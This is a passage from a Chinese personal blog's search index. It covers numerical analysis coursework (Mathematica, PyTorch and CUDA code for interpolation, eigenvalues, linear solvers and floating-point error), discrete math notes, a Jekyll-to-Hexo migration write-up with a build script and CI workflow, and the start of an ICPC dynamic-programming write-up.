#[[1]] &amp;, First[data]]; Return[a + (b + (c + d (x - xi)) (x - xi)) (x - xi)]; )]; 并绘制图形 1234567891011121314GraphicsGrid[ParallelMap[Module[{xi, data}, xi = uniformSample[l, r, #]; data = splineCoefficient[xi, f[xi]]; {Plot[ {f[x], newton[f, xi, x], splineValue[data, x]}, {x, l, r}, PlotLegends -&gt; Placed[{\"f[x]\", \"uniform\", \"spline\"}, Below], PlotLabel -&gt; \"n=\" &lt;&gt; TextString[#]], Plot[ {f[x] - newton[f, xi, x], f[x] - splineValue[data, x]}, {x, l, r}, PlotLegends -&gt; Placed[{\"uniform\", \"spline\"}, Below], PlotLabel -&gt; \"Error n=\" &lt;&gt; TextString[#]] }] &amp;, {11, 21, 31}]] 可以注意到样条法不会发生端点附近剧烈震荡的情况, 误差也要小于高次插值, 但是参数量较大.","tags":["数值分析"],"categories":["课程"]},{"title":"数值分析作业 - 矩阵特征值的数值解法","path":"/2023/4/24/Numeric-6/","content":"Problem 1 幂迭代: 找出绝对值最大的特征值, 为 逆向幂迭代: 找出离 最近的特征值, 为 幂迭代的线性收敛率满足 ; 逆向幂迭代先平移为 再取倒数 此时, 则有 , 逆向幂迭代收敛更快. Problem 2 约化第一列 约化第二列 则有 Problem 3 使用 PyTorch 实现 幂迭代 123456789101112131415161718192021222324252627282930from typing import List, Tupleimport torchimport mathdef power_method(A: torch.Tensor, x0: torch.Tensor, limit: int, tol=1e-6) -&gt; List[Tuple[float, torch.Tensor]]: \"\"\" Power method for computing the largest eigenvalue of a matrix. :param A: A square matrix :param x0: An initial vector :param limit: The number of iterations :param tol: The tolerance for convergence :return: A list of tuples (eigenvalue, eigenvector) \"\"\" x = x0 for k in range(limit): i = x.abs().argmax() x = x / x[i] y = A @ x t = y[i].item() e1 = (y / t - x).norm() if e1 &lt; tol: return [(t, y)] z = A @ y t = z[i].item() e2 = (z / t - x).norm() if e2 &lt; tol and e1 &gt; tol * 100.: lam = math.sqrt(t) return [(lam, z + lam * y), (-lam, z - lam * y)] x = z return [] 逆幂迭代 123456789101112131415161718192021222324252627def inverse_power_method(A: torch.Tensor, x0: torch.Tensor, limit: int, tol=1e-6) -&gt; List[Tuple[float, torch.Tensor]]: \"\"\" Inverse power method for computing the smallest eigenvalue of a matrix. :param A: A square matrix :param x0: An initial vector :param limit: The number of iterations :param tol: The tolerance for convergence :return: A list of tuples (eigenvalue, eigenvector) \"\"\" x = x0 LU, pivots = torch.linalg.lu_factor(A) for k in range(limit): i = x.abs().argmax() x = x / x[i] y = torch.linalg.lu_solve(LU, pivots, x.view(-1, 1)).view(-1) t = y[i].item() e1 = (y / t - x).norm() if e1 &lt; tol: return [(1 / t, x)] z = torch.linalg.lu_solve(LU, pivots, y.view(-1, 1)).view(-1) t = z[i].item() e2 = (z / t - x).norm() if e2 &lt; tol and e1 &gt; tol * 100.: lam = 1 / math.sqrt(t) return [(lam, x + lam * y), (-lam, x - lam * y)] x = z return [] 运行算法求解矩阵 1234567A = torch.tensor([[8, -8, -4], [12, -15, -7], [-18, 26, 12]], dtype=torch.float64)x0 = torch.tensor([1, 1, 1], dtype=torch.float64)torch.set_printoptions(precision=8, sci_mode=False)print(\"Using the power method:\")print(power_method(A, x0, 12))print(\"Using the inverse power method:\")print(inverse_power_method(A, x0, 12)) 输出 12345Using the power method:[(3.9999996821089994, tensor([-3.99999873, -3.99999905, 3.99999968], dtype=torch.float64))]Using the inverse power method:[(-0.9999998211860279, tensor([ -0.00000024, -0.50000018, 1.00000000], dtype=torch.float64))] 接近理论结果. Problem 4 QR 分解 12345678910111213141516171819202122232425262728def qr_decomposition_full(A: torch.Tensor, eps=1e-8) -&gt; Tuple[torch.Tensor, torch.Tensor]: \"\"\" Full QR decomposition of a matrix. :param A: A matrix :param eps: The tolerance for convergence :return: A tuple (Q, R) where Q is an orthogonal matrix and R is an upper triangular matrix \"\"\" m, n = A.shape Q = torch.eye(m, m, dtype=A.dtype) R = A.clone() for k in range(n - 1): t = R[k:, k].norm() if t &lt; eps: continue if R[k, k] &gt; 0: t = -t v = -R[k:, k].clone() v[0] += t R[k, k] = t R[k + 1:, k] = 0 t0 = 2 / (v @ v) for j in range(k + 1, n): t = t0 * (v @ R[k:, j]) R[k:, j] -= t * v for i in range(m): t = t0 * (Q[i, k:] @ v) Q[i, k:] -= t * v return Q, R QR 算法 123456789101112131415def qr_method(A: torch.Tensor, limit: int) -&gt; Tuple[torch.Tensor, torch.Tensor]: \"\"\" QR method for computing the eigenvalues of a matrix. :param A: A square matrix :param limit: The number of iterations :param tol: The tolerance for convergence :return: A tuple (eigenvalues, Q) where eigenvalues is a vector of eigenvalues and Q is an orthogonal matrix \"\"\" n = A.shape[0] Qbar = torch.eye(n, n, dtype=A.dtype) for k in range(limit): Q, R = qr_decomposition_full(A) A = R @ Q Qbar = Qbar @ Q return A.diag(), Qbar 运行求解 12print(\"Using the QR method:\")print(qr_method(A, 25)) 输出: 12345Using the QR method:(tensor([ 4.00000001, 1.99999996, -0.99999997], dtype=torch.float64),tensor([[-0.57735026, -0.61721341, 0.53452248], [-0.57735027, -0.15430336, -0.80178373], [ 0.57735028, -0.77151674, -0.26726124]], dtype=torch.float64)) 注意到只有特征值 的特征向量收敛到了正确结果","tags":["数值分析"],"categories":["课程"]},{"title":"数值分析作业 - 对称正定线性方程组的解法","path":"/2023/4/19/Numeric-5/","content":"Problem 1 则该矩阵正定. Cholesky 分解: 回代求解: 先求解 再求解 Problem 2 共轭方向法 首先产生两个共轭方向 然后进行迭代 共轭梯度法 Problem 3 仍然基于 CUDA C++ 和 cuBLAS 实现两种算法. 算法实现参见 spd.cu. 对于问题 1 中的方程, 使用梯度下降法以及共轭梯度法进行求解: 1234567Testing small matrixGradient descent did not converge in 50 iterations0.99999221 1.99998272 -1.00000174Gradient Descent: 23.11msConjugate gradient finally converged in 3 iterations1.00000000 2.00000000 -1.00000000Conjugate Gradient: 2.086ms 观察到梯度下降法经过 50 次迭代达到设置的极限时, 仍然有较明显的误差, 而共轭梯度法只需很少的迭代即可收敛到精确解. 为了充分测试算法的性能, 通过下列方法构造大规模的测试数据: 使用 区间内均匀随机数填充 确保 至少是半正定 使用 区间内均匀随机数填充 取 , 运行算法并比较求出的解与精确解的无穷范数 1234567Testing large matrix with n = 1000Gradient descent did not converge in 1500 iterationsGradient Descent: 432.497msNorm: 0.20379112Conjugate gradient finally converged in 1000 iterationsConjugate Gradient: 389.31msNorm: 0.05191499 能注意到梯度下降法的迭代速度略快与共轭梯度法, 但是即使梯度下降法消耗了更长时间, 其精度仍不如共轭梯度法.","tags":["数值分析"],"categories":["课程"]},{"title":"数值分析作业 - 线性方程组的迭代法","path":"/2023/4/5/Numeric-4/","content":"通过 CUDA 和 cuBLAS 实现高效的硬件加速迭代求解算法. Jacobi 迭代使用 BLAS 算子表示的伪代码 1234567891011121314151617qinv 是 A 的主对角线上元素的倒数构成的 n 维向量QmA 是 A 的主对角线为零, 其余元素取相反数构成的 n * n 矩阵for (i = 1; i &lt;= limit; i++) { y &lt;- x; x &lt;- b; gemv(1, QmA, y, x) // x &lt;- QmA * y + x x &lt;- x * qinv // 非标准算子, 向量按位乘法 delta &lt;- x axpy(-1, y, delta) // delta &lt;- -1 * y + delta norm = nrm2(delta) if (norm &lt; eps) { result &lt;- x return true; }}return false; Gauss-Seidel 和 SOR 迭代使用 BLAS 算子表示的伪代码 1234567891011121314151617181920minusU 是 A 的上三角不含对角线, 取相反数, 其余元素为零for (int i = 1; i &lt;= limit; i++) { y &lt;- x trmv(UPPER_WITH_DIAG, minusU, x) // x &lt;- minusU * x axpy(1, b, x) // x &lt;- b + x trsv(LOWER_WITH_DIAG, A, x) // Solve At = x for t, x &lt;- t if (omega != 1) { scal(omega, x) // x &lt;- omega * x axpy(1 - omega, y, x) // x &lt;- (1 - omega) * y + x } delta &lt;- x axpy(-1, y, delta) // delta &lt;- -1 * y + delta norm = nrm2(delta) if (norm &lt; eps) { result &lt;- x return true; }}return false; 具体的 CUDA C++ 实现请参考代码文件 lsim.cu. 求解上面的 3x3 矩阵, 输出 12345678910Testing small matrixConverged in 19 iterations-1.24489744 -0.57142823 1.16326494Jacobi: 12.536msConverged in 12 iterations-1.24489786 -0.57142853 1.16326528GaussSeidel: 2.285msConverged in 10 iterations-1.24489786 -0.57142858 1.16326529SOR: 2.782ms SOR 迭代取 . 观察到三种算法都收敛到了期望的值. 求解更大的矩阵, 例如将下面的矩阵扩大到 , 简单取 12345678910Testing large matrix n=10000Converged in 140 iterationsokJacobi: 570.889msConverged in 78 iterationsokGaussSeidel: 543.641msConverged in 70 iterationsokSOR: 528.95ms 可以看到有迭代次数 . 得益于 GPU 加速计算, 即使不使用稀疏矩阵表示法, 算法运行也非常快.","tags":["数值分析"],"categories":["课程"]},{"title":"数值分析作业 - 线性方程组的直接求解","path":"/2023/3/24/Numeric-3/","content":"Problem 1 条件数 误差放大因子 Problem 2 Gauss 消元 列主消元 LU 分解 由此前的 Gauss 消元过程 LUP 分解 由列主消元过程 Problem 3 Gauss 消元 123456789101112131415161718192021222324gaussElimination[A_?SquareMatrixQ, B_?VectorQ] := Module[{a, b, n, x, sum, xmult}, ( a = A; b = B; n = Length[A]; Do[( xmult = a[[i, k]]/a[[k, k]]; a[[i, k]] = xmult; Do[( a[[i, j]] -= xmult a[[k, j]]; ), {j, k + 1, n}]; b[[i]] -= xmult b[[k]]; ), {k, 1, n - 1}, {i, k + 1, n}]; x = ConstantArray[0, n]; x[[n]] = b[[n]]/a[[n, n]]; Do[( sum = b[[i]]; Do[( sum -= a[[i, j]] x[[j]]; ), {j, i + 1, n}]; x[[i]] = sum/a[[i, i]]; ), {i, n - 1, 1, -1}]; Return[x]; )]; LU 分解 分解出 LU: 12345678910111213luDecomposition[A_?SquareMatrixQ] := Module[{a, n, xmult}, ( a = A; n = Length[A]; Do[( xmult = a[[i, k]]/a[[k, k]]; a[[i, k]] = xmult; Do[( a[[i, j]] -= xmult a[[k, j]]; ), {j, k + 1, n}]; ), {k, 1, n - 1}, {i, k + 1, n}]; Return[a]; )]; 利用分解的 LU 和 b 求解 X: 12345678910111213141516171819luSolve[A_?SquareMatrixQ, B_?VectorQ] := Module[{a, b, n, x, sum}, ( a = A; b = B; n = Length[A]; Do[( b[[i]] -= a[[i, k]] b[[k]]; ), {k, 1, n - 1}, {i, k + 1, n}]; x = ConstantArray[0, n]; x[[n]] = b[[n]]/a[[n, n]]; Do[( sum = b[[i]]; Do[( sum -= a[[i, j]] x[[j]]; ), {j, i + 1, n}]; x[[i]] = sum/a[[i, i]]; ), {i, n - 1, 1, -1}]; Return[x]; )]; 分析 123456a = ( { {3, 1, 2}, {6, 3, 4}, {3, 2, 5} } );b = {11, 24, 22}; 验证 LU 分解的结果: 1luDecomposition[a] // TeXForm 1luSolve[luDecomposition[a], b] 1{1, 2, 3} 验证高斯消元的结果: 1gaussElimination[a, b] 1{1, 2, 3} 符号求解 12 阶 Hilbert 矩阵 1234h = HilbertMatrix[12];b = h . ConstantArray[1, 12];luSolve[luDecomposition[h], b]gaussElimination[h, b] 12{1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1}{1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1} 数值求解 12 阶 Hilbert 矩阵: 1234h = HilbertMatrix[12, WorkingPrecision -&gt; MachinePrecision];b = h . ConstantArray[1, 12];gaussElimination[a, b] // InputFormluSolve[luDecomposition[h], b] // InputForm 1234{0.9999999684484674, 1.0000039869936317, 0.9998748290952993, 1.0017037342786466, 0.9875174669874949, 1.0548274080293765, 0.847263047196586, 1.2764525211919366, 0.675899878028198, 1.2373689708614504, 0.9013048730327599, 1.0177833372228902} 数值求解 20 阶 Hilbert 矩阵: 1234h = HilbertMatrix[20, WorkingPrecision -&gt; MachinePrecision];b = h . ConstantArray[1, 20];gaussElimination[h, b] // InputFormluSolve[luDecomposition[h], b] // InputForm 1234567{1.0000003421959727, 0.9999417184300158, 1.0024368580495062, 0.9562365916942744, 1.4191051439028362, -1.3773308447433001, 9.396245254529573, -17.68936344786112, 26.745626004265336, -21.158082774623054, 20.368520692739086, -32.72056597175268, 47.971136818868764, -25.84867109603557, -15.141625406272288, 47.602402521150054, -50.83989911260756, 38.52515460862537, -15.334245951012626, 4.122978309329297}","tags":["数值分析"],"categories":["课程"]},{"title":"数值分析作业 - 非线性求解方程","path":"/2023/3/18/Numeric-2/","content":"Problem 1 分析收敛阶: 二分法每步将误差缩小 , 线性收敛, 收敛阶为 , 割线法收敛阶为 不动点迭代 , 收敛阶为 , 不动点迭代 , 收敛阶为 , 牛顿法收敛阶为 先比较收敛阶大小, 收敛阶为 时比较 的大小, 可以判断收敛速度: Problem 2 则牛顿法对应的不动点迭代 阶收敛, 误差满足 Problem 3 局部收敛 不收敛 Problem 4 则 是三重根, 牛顿法不二次收敛, Problem 5 则牛顿法局部二次收敛, 有 估计 由 的结论 估计 Problem 6 Problem 7 二分法 12345678910111213141516171819202122232425precision = 10;binarySearch[fun_, var_, l0_, r0_, delta_] := Module[{f, a, b, fa, fb, l, r, \\[Rho], n}, (f[x_] = N[fun /. var -&gt; x, precision]; \\[Rho] = 1/2; l[1] = l0; r[1] = r0; n = 1; While[r[n] - l[n] &gt; delta, mid = (l[n] + r[n])/2; If[f[mid] &gt; 0, ( l[n + 1] = l[n]; r[n + 1] = mid; ), ( l[n + 1] = mid; r[n + 1] = r[n]; )]; n++;]; Print[ TableForm[ Table[NumberForm[#, precision] &amp; /@ {l[i], r[i], f[(l[i] + r[i])/2]}, {i, 1, n - 1}], TableHeadings -&gt; {Range[n - 1], {\"l\", \"r\", \"f(mid)\"}}]]; Return[{l[n], r[n]}];)];binarySearch[E^x + x - 7, x, 0., 3., 1.*^-8] 不动点迭代 构造一种可行的不动点迭代形式 1NestList[Log[7 - #] &amp;, 0., 20] // InputForm 1234567{0., 1.9459101490553132, 1.6201977869925166, 1.6826516101163946, 1.6709747561453339, 1.673168340375046, 1.6727566260886084, 1.6728339137527832, 1.6728194056442924, 1.6728221290601764, 1.6728216178297926, 1.6728217137962444, 1.672821695781745, 1.6728216991633662, 1.6728216985285795, 1.6728216986477396, 1.6728216986253712, 1.67282169862957, 1.672821698628782, 1.67282169862893, 1.6728216986289022} 牛顿法 1NestList[# - (E^# + # - 7)/(E^# + 1) &amp;, 0., 20] // InputForm 1234567{0., 3., 2.2371293658878337, 1.7930473102816238, 1.6787764832017877, 1.6728366106108064, 1.6728216987225175, 1.6728216986289066, 1.6728216986289064, 1.6728216986289066, 1.6728216986289064, 1.6728216986289066, 1.6728216986289064, 1.6728216986289066, 1.6728216986289064, 1.6728216986289066, 1.6728216986289064, 1.6728216986289066, 1.6728216986289064, 1.6728216986289066, 1.6728216986289064} 试位法 12345678910111213141516171819202122tryPosition[fun_, var_, l0_, r0_, it_] := Module[{f, l, r, c, n}, ( f[x_] = N[fun /. var -&gt; x, precision]; l[1] = l0; r[1] = r0; n = 1; Do[ c[n] = (r[n] f[l[n]] - l[n] f[r[n]])/(f[l[n]] - f[r[n]]); If[f[l[n]] f[c[n]] &gt; 0, ( l[n + 1] = l[n]; r[n + 1] = c[n]; ), ( l[n + 1] = c[n]; r[n + 1] = r[n]; )]; n++;, it]; Print[ TableForm[ Table[NumberForm[#, precision] &amp; /@ {l[i], r[i], c[i], f[c[i]]}, {i, 1, n - 1}], TableHeadings -&gt; {Range[n - 1], {\"a\", \"b\", \"c\", \"f(c)\"}}]]; Return[{l[n], r[n]}];)];tryPosition[E^x + x - 7, x, 0., 3., 20] 关于收敛性的比较: 运行结果表明所有的方法都能收敛到唯一的零点. 与 NSolveValue 直接求解的结果作比较, 绘制绝对误差的绝对值 (对数尺度纵坐标): 可以看出不同算法的收敛速度, 从快到慢排序: 牛顿法 不动点迭代 试位法 二分法","tags":["数值分析"],"categories":["课程"]},{"title":"数值分析作业 - 浮点运算和误差","path":"/2023/3/11/Numeric-1/","content":"Problem 1 说明分析单精度计算 fl(9.4)−fl(9)−fl(0.4) 的结果，并进行计算机实践。 Symbol Exponent mantissa 9.4f + 0 3 + 127 = 10000010 100101100110011001100110 9.0f + 0 3 + 127 = 10000010 100100000000000000000000 9.4f-9.0f + 0 3 + 127 = 10000010 000001100110011001100110 Lsh 5 + 0 -2 + 127 = 01111101 110011001100110011000000 0.4f + 0 -2 + 127 = 01111101 110011001100110011001101 9.4f-9.0f-0.4f - 1 -2 + 127 = 01111101 000000000000000000001101 Lsh 20 - 1 -22 + 127 = 01101001 110100000000000000000000 得到计算结果为 编写辅助函数用于输出浮点数的比特 12345678910111213#define print_fpbits(x) print_fpbits_impl(x, #x)template &lt;typename T&gt;void print_fpbits_impl(T value, std::string expr) { auto y = reinterpret_cast&lt;std::uint8_t*&gt;(&amp;value); std::cout &lt;&lt; expr &lt;&lt; \": \" &lt;&lt; std::endl; for (int i = sizeof(T) - 1; i &gt;= 0; i--) { char byte = y[i]; for (int j = 7; j &gt;= 0; j--) { std::cout &lt;&lt; ((byte &gt;&gt; j) &amp; 1); } } std::cout &lt;&lt; std::endl;} 验证计算过程 123456print_fpbits(9.4f);print_fpbits(9.0f);print_fpbits(0.4f);print_fpbits(9.4f - 9.0f);print_fpbits(9.4f - 9.0f - 0.4f);std::cout &lt;&lt; std::format(\"{:.12f} \", 9.4f - 9.0f - 0.4f); 得到输出 12345678910119.4f:010000010001011001100110011001109.0f:010000010001000000000000000000000.4f:001111101100110011001100110011019.4f - 9.0f:001111101100110011001100110000009.4f - 9.0f - 0.4f:10110100110100000000000000000000-0.000000387430 Problem 2 说明设计高效的多项式算法 , 计算机编程比较直接算法与优化算法的计算时间（采用双精度进行计算，分别循环 次） 容易写出直接的 多项式计算方法 1234567891011121314151617const double coef[] = {1, 0, 0, 2, 0, 0, 0, 3, 0, 0, 0, 4, 0, 0, 0, 5};double pow_naive(double x, int n) { double res = 1.0; for (int i = 1; i &lt;= n; i++) { res *= x; } return res;}double f_naive(double x) { double res = 0.; for (int i = 0; i &lt;= 15; i++) { res += coef[i] * pow_naive(x, i); } return res;} 和简单的 优化 123456789double f_fast(double x) { double res = 0.; double pow = 1.; for (int i = 0; i &lt;= 15; i++) { res += coef[i] * pow; pow *= x; } return res;} 需要注意的是, 针对 C++ 一类编译器具有强大静态优化能力的编程语言, 将简单的算法在同样的输入下单纯地重复运行并不是合理的性能测量方式, 因为编译器很容易将整个循环删除掉. 简单起见, 可以在循环中要求从 std::vector 中读取并存储数据, 以防止无用的循环被删除. 下面报告程序在 MSVC 19.33.31629.0 下, 简单循环 次的用时 1234x = 2, naive: 2272.14msx = 2, fast: 418.473msx = 2.22... naive: 2245.62msx = 2.22..., fast: 426.92ms 启用 /O2 优化后, 性能有显著的提升 1234x = 2, naive: 686.996msx = 2, fast: 113.86msx = 2.22... naive: 670.233msx = 2.22..., fast: 108.462ms Problem 3 说明推导计算 的递推公式,用正向和逆向递推计算 ，比较并分析两种迭代的误差和稳定性。 容易推导公式 初始值可以取 这个正向递推公式每次递推将误差放大五倍 12forward = (NestList[{E - #[[2]] #[[1]], #[[2]] + 1} &amp;, {1., 2}, 20] // Transpose)[[1]];forward // InputForm 1234567{1., 0.7182818284590451, 0.5634363430819098, 0.4645364561314058, 0.395599547802016, 0.34468454164694906, 0.30549003693040166, 0.27436153301583177, 0.24902803131655915, 0.22800151529345358, 0.21026516023105568, 0.19509990568637692, 0.18198305453614516, 0.17051906495301283, 0.1604958541638526, 0.15034816183740363, 0.16236307722318344, -0.2042535615582568, 6.599099498065924, -129.26370813285942, 2717.256152618507} 注意到在 16 项处由于误差的累积导致积分有界性已被破坏, 之后的迭代过程明显不收敛. 考虑反向迭代公式 取 反向迭代 123backward = (NestList[{1/#[[2]] (E - #[[1]]), #[[2]] - 1} &amp;, {1., 30}, 29] // Transpose)[[1]] // Reverse;backward // InputForm 12345678910{1., 0.7182818284590452, 0.5634363430819095, 0.4645364561314071, 0.3955995478020096, 0.3446845416469873, 0.30549003693013366, 0.27436153301797606, 0.24902803129726034, 0.2280015154864418, 0.21026515810818536, 0.19509993116082064, 0.18198272336837695, 0.17052370130176742, 0.16042630893253398, 0.15146088553850115, 0.14344677430452524, 0.13623989097759062, 0.12972389988482333, 0.12380383076257832, 0.11840138244490007, 0.1134514146712435, 0.10889929102044421, 0.10469884396838404, 0.10081072924944416, 0.09720286797349674, 0.09380439317463288, 0.09175881956932448, 0.057276060948634834, 1.} 与 NIntegrate 直接积分 (保证 20 位有效数字) 的结果比较并绘制图像 1234direct = Table[NIntegrate[x^n E^x, {x, 0, 1}, AccuracyGoal -&gt; 20, WorkingPrecision -&gt; 20], {n, 1, 20}];ListLinePlot[{forward, backward, direct}] 绘制两种算法和直接数值积分法的残差 12ListLinePlot[ Abs[{Take[forward, 20] - direct, Take[backward, 20] - direct}]] 由于反向迭代逐渐减小误差的特性, 表现远好于正向迭代","tags":["数值分析"],"categories":["课程"]},{"title":"离散数学速通","path":"/2023/2/21/DiscreteMath/","content":"集合论 集合的三大特征 互异性 确定性 无序性 子集, 真子集, 包含, 真包含 基数 / 势, 有限集, 无限集 可数集, 不可数集, 等势 子集总数, 幂集 并集, 交集, 差集, 补集, 对称差 集合运算律 1 集合运算律 2 计数问题 加法原理, 乘法原理 排列问题, 组合问题 圆排列 容斥原理, 鸽笼原理 离散概率, 概率函数 递归关系 命题逻辑 命题 原子命题 / 简单命题, 复合命题 命题联结词 否定 合取 析取 蕴含 双条件 / 等价 联结词真值表 命题公式, 命题变量 解释, 真值表 永真公式 / 重言式, 永假公式 / 矛盾式, 可满足公式 公式等价 : 任意解释下真值相同 永真 基本等价公式 1 基本等价公式 2 基本等价公式 3 代入定理, 替换定理 范式 文字: 命题变元及否定 子句: 有限个文字的析取式 短语: 有限个文字的合取式 互补对: 析取范式, 合取范式: 外层是析取 / 合取 主析取范式, 主合取范式 极小项(合取), 极大项(析取) 永真公式主合取范式为空, 永假公式主析取范式为空 推理 前提, 结论 判定定理 推理规则 P 规则: 前提引用 T 规则: 逻辑结果引用 CP 规则: 附加前提规则, 从前提集合 和 推出 , 则从前提集合推出 间接证明 (反证) 推理定律 1 推理定律 2 谓词逻辑 个体词, 谓词, 命题函数 个体常量, 个体变量, 个体域 全称量词, 存在量词, 作用变量 谓词公式 常量符号, 变量符号, 函数符号, 谓词符号 项, 原子谓词公式, 合式公式 自由变元, 约束变元, 闭式 解释 有效公式, 矛盾公式, 可满足公式 有效公式是可满足公式 代入示例: 谓词公式代入命题公式 谓词演算的有效公式 1 谓词演算的有效公式 2 谓词演算的有效公式 3 范式 前束范式: 所有量词都在最前端 Skolem 标准型: 消去前束范式的量词 谓词推理规律 1 谓词推理规律 2 谓词推理规律 3 谓词推理规则 US: , 所选用取代 的变元 在公式中必须是自由的 ES: 若还有其它自由变元时，则必须用关于自由变元的函数符号来取代常量符号. UG: 所使用的变元符号不能与辖域内的变元符号相同. EG: , 所使用的变元符号不能与辖域内的变元符号相同. 证明技术 直接证明 , 通过证明 永真 间接证明 , 通过证明 永真 空证明 , 证明 为假 平凡证明 , 证明 为真 归谬证明 , 找到矛盾式 使得 为真 分类讨论 , 证明 等价证明 , 证明 存在性证明, 唯一性证明 数学归纳法 归纳基础: 为真 对于任意 : 归纳假设: 若 为真 归纳结论: 为真 对所有整数 , 有 为真 强形式数学归纳法 归纳基础: 为真 对于任意 : 强归纳假设: 若任意 为真 归纳结论: 为真 对所有整数 , 有 为真 二元关系 序偶, 笛卡尔积, 重有序组 二元关系, 空关系, 全关系 集合表示法, 关系图法, 关系矩阵 关系的复合运算, 逆运算 关系运算律 关系的幂运算 关系的性质 自反性: 反自反性: 对称性: 反对称性: 传递性: 我直接粘 PPT 我直接粘 PPT 闭包: 增加最少元素，使其具备所需性质的扩充. 自反闭包, 对称闭包, 传递闭包 特殊关系 关系 自反 反自反 对称 反对称 传递 例子 等价关系 ✔ ✔ ✔ 偏序关系 ✔ ✔ ✔ 拟序关系 ✔ ✔ ✔ 利用等价关系划分集合, 商集 偏序关系可绘制哈斯图 自反性: 省去自环 反对称性: 省去箭头, 小的画在下方 传递性: 省去三角边 偏序集上: 最大元, 最小元, 极大元, 极小元 偏序集的子集: 上界, 下界, 上确界(最小上界), 下确界(最大下界) 全序 / 线序: , 哈斯图是一条链 良序: 任意非空子集都有最小元素 有限全序集一定是良序集 函数 满射: 中的像在填满了集合 , 即 中每个元在 中都有原象. 单射: 中不同元的像不同. 双射 (1-1 映射): 既是单射又是满射. 单射 左可逆映射 满射 右可逆映射 双射 可逆映射 常用函数 恒等函数 常值函数 特征函数 上取整函数 下取整函数 布尔函数 复合, 逆运算 置换函数 (有限集合上的双射函数)","tags":["离散数学"],"categories":["课程"]},{"title":"关于迁移到 Hexo 的技术说明","path":"/2023/2/10/Migrate-To-Hexo/","content":"前几天把本站从 Jekyll 迁移到了 Hexo, 原先的网站部署在 archive-2023.duanyll.com 下面说明迁移过程的一些技术问题以供参考. 放弃 Jekyll 的原因 烂掉的公式 公式渲染问题: 最近上传了几篇课程速通类型的笔记, 内含大量的复杂数学公式. Jekyll 生成器不具备识别 $ 和 $$ 定界符的能力, 对于包含 * 和 | 等特殊 Markdown 字符的公式, 会被优先识别成斜体和表格, 使得前端 MathJax 无法渲染. 另外, 使用 pix2tex 等程序生成的公式可能含有嵌套的大括号 {{}}, 会被 Liquid 模版转义. Ruby 环境问题: 我不熟悉 Ruby 语言, 安装 Jekyll 的 Gem 包出了很多锅. 主题: 原来的主题看腻了, 而且还有一些错位的 Bug, 响应式完全是烂的, 好看的 Jekyll 主题不多. 很早以前 GitHub Pages 仅支持在线构建 Jekyll (而且不支持插件), 后来通过 GitHub Actions 机制来生成 Pages 后, Jekyll 就失去独占优势了. 为什么不选择 Hugo Hugo 构建的速度的确远快于 Hexo, 并且官网主题库的质量一眼高于 Hexo (尤其是极简风格主题). 但是 Hexo 使用内置的 GoldMark 解析器, 默认配置下后端不支持 $ 公式, 会导致同样的问题, 若要使用 GoldMark 插件解析公式, 则需要重新编译 Hexo 可执行文件, 不利于 CI. Hexo 基于 Node, 走投无路了大力 patch-package 改包也算是比较优雅的方案, 而且在不改包的情况下也能通过 Node API 实现丰富的自定义功能. 目前的解决方案 主题和插件 hexo-theme-cactus 优质的极简风格主题 hexo-filter-mathjax 和 hexo-renderer-pandoc: 调用 Pandoc 解析 Markdown, 并在生成时利用 MathJax 将公式渲染为 SVG 并嵌入 HTML 中. 默认的 hexo-renderer-marked 同样难以处理复杂公式的情况. hexo-generator-feed: 生成 RSS 订阅 hexo-generator-search: 生成文章列表索引文件以便搜索 (目前似乎有锅) hexo-generator-sitemap: 生成 Google Sitemap hexo-generator-category: 生成文章分类目录 脚本 将脚本放入 scripts 文件夹, 就会在 Hexo 生成时执行. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647const path = require(\"path\");const moment = require(\"moment\");const RE_FILENAME = /^(\\d{4}-\\d{1,2}-\\d{1,2})-(.*)$/;const categoryMap = { course: \"课程\", literature: \"文字\", oi: \"OI\", old: \"存档\", project: \"项目\", tech: \"技术\",};/** * 从文件名中读取文章发表日期，从所在文件夹中读取文章所属分类 * * source/_posts/course/2020-5-5-Derivative.md * * 设置日期为 2020-5-5，分类为课程 */hexo.extend.filter.register(\"before_post_render\", async (data) =&gt; { if (data.layout === \"post\") { const filename = path.basename(data.source, path.extname(data.source)); const matches = filename.match(RE_FILENAME); if (matches) { data.date = moment(matches[1], \"YYYY-M-D\"); data.title || (data.title = matches[2]); } const dirname = path.basename(path.dirname(data.source)); if (dirname in categoryMap) { await data.setCategories([categoryMap[dirname]]); } } return data;});/** * 转换 permalink 以符合 jekyll 风格，移除多余的日期 * * /2020/5/5/2020-5-5-Derivative =&gt; /2020/5/5/Derivative */hexo.extend.filter.register(\"post_permalink\", function (data) { return data.replace(/[^/]*\\d{4}-\\d{1,2}-\\d{1,2}-/, \"\");}); 图床 原先用 sm.ms 免费图床, 总是感觉不靠谱 (虽然到现在还没出过什么大问题), 现在用阿里云 OSS 香港区做图床, 有 5GB 免费容量和每月 5GB 免费流量, 再套一层 Cloudflare, 够用很久了. 没用 Backblaze 主要是因为 vs-picgo 默认不支持, 不太方便. GitHub Actions 1234567891011121314151617181920212223242526272829303132333435name: Hexo buildon: push: branches: - master # default branchjobs: pages: runs-on: ubuntu-latest steps: - uses: actions/checkout@v2 with: submodules: recursive - name: Use Node.js 16.x uses: actions/setup-node@v2 with: node-version: \"16\" - uses: awalsh128/cache-apt-pkgs-action@latest with: packages: pandoc version: 1.0 - name: Run install uses: borales/actions-yarn@v4 with: cmd: install - name: Run build uses: borales/actions-yarn@v4 with: cmd: build - name: Deploy uses: peaceiris/actions-gh-pages@v3 with: github_token: ${{ secrets.GITHUB_TOKEN }} publish_dir: ./public","tags":["公告"],"categories":["技术"]},{"title":"2022 UESTC ICPC Training for Dynamic Planning","path":"/2022/5/21/UESTC-ICPC-Training-DP/","content":"http://acm-uestc-edu-cn-s.vpn.uestc.edu.cn:8118/contest/172/summaryhttp://acm-uestc-edu-cn-s.vpn.uestc.edu.cn:8118/contest/172/summary A 首先考虑经典的 LCS 做法: 指考虑了 的前 个字符和 的前 个字符的答案. 本题中公式涉及到 长度的项, 只需要转移的时候相应地加上在 或者 方向上拓展的长度即可. 注意到 是负数, 因此进行拓展并不一定是最优解, 所以这个时候也要进行不拓展的转移. 于是得到求完整答案的转移方式: 在考虑如何只求子串的答案. 子串的终点容易处理, 直接最后取所有 的最大值即可, 至于子串的起点, 可以通过每次转移时增加一种直接从头开始的转移方式, 即 时, 允许直接转移 ; 时, 转移 . 最终的 dp 方程: D 随便都能想到的 , 处理完 后三个机械臂分别位于 处, 转移方式非常显然, 但明显 跑不过, 